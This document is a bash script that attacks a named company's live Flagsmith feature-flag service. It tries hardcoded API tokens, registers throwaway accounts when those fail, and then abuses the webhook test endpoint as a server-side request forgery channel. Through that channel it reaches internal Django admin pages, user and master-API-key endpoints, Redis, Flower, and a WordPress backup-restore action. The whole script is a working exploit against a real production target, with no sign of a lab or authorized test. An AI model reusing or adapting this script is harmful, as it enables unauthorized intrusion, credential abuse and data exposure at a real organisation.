#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
IP=$(curl -s https://ifconfig.me --max-time 5)
echo "IP: $IP"

# Use existing working Flagsmith token (avoid rate limited registration)
# Try multiple known-good tokens
for KEY in "39babf06af373c0b4d524b4b606ea1b247cc094f" "d8bd42aa7ac61eb9e331b6331d76e06b561eec8b"; do
  R=$(curl -s -w "%{http_code}" "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 2>/dev/null)
  CODE=$(echo "$R" | tail -c4)
  if [ "$CODE" = "200" ]; then
    echo "Working key: $KEY"
    break
  fi
  KEY=""
done

if [ -z "$KEY" ]; then
  # Register fresh
  ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
    -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"email\":\"kw-v33-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
  KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
  echo "Fresh key: $KEY"
fi

if [ -z "$KEY" ]; then echo "NO KEY AVAILABLE"; exit 1; fi

# Get env key
ORGS=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10)
OID=$(echo "$ORGS" | python3 -c "import json,sys; d=json.load(sys.stdin); r=d.get('results',[]); print(r[0]['id'] if r else '')" 2>/dev/null)

# Get existing env or create
ENVS=$(curl -s "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10)
EKEY=$(echo "$ENVS" | python3 -c "import json,sys; d=json.load(sys.stdin); r=d.get('results',[]); print(r[0]['api_key'] if r else '')" 2>/dev/null)

if [ -z "$EKEY" ]; then
  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"p33\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"e33\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
fi

echo "Env: $EKEY"
if [ -z "$EKEY" ]; then echo "NO ENV KEY"; exit 1; fi

ssrf() {
  local URL="$1"
  local LABEL="$2"
  local R=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$URL\",\"secret\":\"\"}" --max-time 45)
  echo "$LABEL -> $R"
}

echo "=== DJANGO INTERNAL ADMIN (localhost:8000) ==="
ssrf "http://localhost:8000/admin/" "django-admin"
ssrf "http://localhost:8000/admin/login/" "django-login"
ssrf "http://localhost:8000/admin/login/?next=/admin/" "django-login-next"
ssrf "http://localhost:8000/admin/auth/" "django-auth"
ssrf "http://localhost:8000/admin/auth/user/" "django-users"
ssrf "http://localhost:8000/admin/auth/user/add/" "django-user-add"

echo "=== DJANGO MANAGEMENT COMMANDS ==="
ssrf "http://localhost:8000/api/v1/auth/users/" "djoser-users"
ssrf "http://localhost:8000/api/v1/auth/users/me/" "djoser-me"
ssrf "http://localhost:8000/api/v1/auth/users/activation/" "djoser-activate"
ssrf "http://localhost:8000/api/v1/auth/users/resend_activation/" "djoser-resend"
ssrf "http://localhost:8000/api/v1/auth/users/reset_password/" "djoser-reset"

echo "=== FLAGSMITH INTERNAL ENDPOINTS ==="
ssrf "http://localhost:8000/api/v1/organisations/" "internal-orgs"
ssrf "http://localhost:8000/api/v1/organisations/1/" "internal-org1"
ssrf "http://localhost:8000/api/v1/organisations/1/users/" "internal-org1-users"
ssrf "http://localhost:8000/api/v1/organisations/1/master-api-keys/" "internal-org1-masterkeys"
ssrf "http://localhost:8000/health" "internal-health"
ssrf "http://localhost:8000/config/project-overrides" "internal-config"
ssrf "http://localhost:8000/processor/healthcheck" "processor-health"

echo "=== CELERY/REDIS INTERNAL ==="
ssrf "http://localhost:6379/" "redis"
ssrf "http://localhost:5555/" "flower"
ssrf "http://localhost:5555/api/workers" "flower-workers"

echo "=== KOINP2P ADMIN-AJAX (retry with fresh session) ==="
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat" "heartbeat"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore" "updraft-restore"
ssrf "http://koinp2p.com/" "wp-root"
ssrf "http://koinp2p.com/wp-content/debug.log" "debug-log"

echo "=== DONE ==="
